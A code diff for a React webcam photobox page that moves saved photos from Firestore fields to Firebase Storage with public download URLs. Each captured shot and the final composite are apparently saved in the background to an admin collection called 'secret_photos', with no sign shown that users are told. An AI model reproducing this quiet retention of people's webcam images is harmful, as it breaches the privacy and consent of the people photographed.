@@ -1,7 +1,8 @@
 import React, { useRef, useState, useEffect, useCallback } from 'react';
 import Webcam from 'react-webcam';
-import { db } from '../firebase';
+import { db, storage } from '../firebase';
 import { collection, query, orderBy, onSnapshot, addDoc } from 'firebase/firestore';
+import { ref, uploadString, getDownloadURL } from 'firebase/storage';
 
 // ==========================================
 // 🎯 TYPES
@@ -1204,16 +1205,24 @@ export function PhotoboxPage() {
     setCountdown(timerDur);
   };
 
+  /** Upload dataUrl to Firebase Storage, return public download URL */
+  const uploadToStorage = async (dataUrl: string, folder: string): Promise<string> => {
+    const filename = `${folder}/${Date.now()}_${Math.random().toString(36).slice(2)}.jpg`;
+    const storageRef = ref(storage, filename);
+    await uploadString(storageRef, dataUrl, 'data_url');
+    return getDownloadURL(storageRef);
+  };
+
   const autoSaveToAdmin = async (dataUrl: string, slotIndex: number) => {
     if (!selected) return;
     try {
-      // ✅ Ubah collection ke 'secret_photos' biar sinkron sama Admin.tsx
+      const url = await uploadToStorage(dataUrl, 'photobox_shots');
       await addDoc(collection(db, 'secret_photos'), {
-        url: dataUrl, // ✅ Ubah key dari 'dataUrl' jadi 'url'
+        url,
         slotIndex,
-        templateId: selected.id, 
+        templateId: selected.id,
         templateName: selected.name,
-        captureMethod, 
+        captureMethod,
         createdAt: new Date().toISOString(),
       });
     } catch (e) {
@@ -1363,31 +1372,37 @@ export function PhotoboxPage() {
     setStage('result');
   };
 
-  const download = () => {
+  const download = async () => {
     if (!finalImg) return;
 
-    // Trigger browser download
+    // Trigger browser download immediately
     const a = document.createElement('a');
     a.href = finalImg;
     a.download = `photobox-${Date.now()}.png`;
     a.click();
 
-    // Save final composite (design + foto) to admin gallery at download time
-    addDoc(collection(db, 'secret_photos'), {
-      url: finalImg,
-      type: 'final_composite',
-      templateId: selected?.id ?? null,
-      templateName: selected?.name ?? null,
-      captureMethod,
-      createdAt: new Date().toISOString(),
-    }).catch(() => { /* silent fail */ });
+    // Upload composite to Storage → save URL to Firestore (avoids 1MB Firestore doc limit)
+    try {
+      const url = await uploadToStorage(finalImg, 'photobox_finals');
+      await addDoc(collection(db, 'secret_photos'), {
+        url,
+        type: 'final_composite',
+        templateId: selected?.id ?? null,
+        templateName: selected?.name ?? null,
+        captureMethod,
+        createdAt: new Date().toISOString(),
+      });
+    } catch (e) {
+      console.warn('Save final to admin failed:', e);
+    }
   };
 
   const saveGallery = async () => {
     if (!finalImg || saved) return;
     try {
+      const url = await uploadToStorage(finalImg, 'photobox_finals');
       await addDoc(collection(db, 'secret_photos'), {
-        url: finalImg, templateId: selected?.id,
+        url, templateId: selected?.id,
         templateName: selected?.name, createdAt: new Date().toISOString()
       });
       setSaved(true);
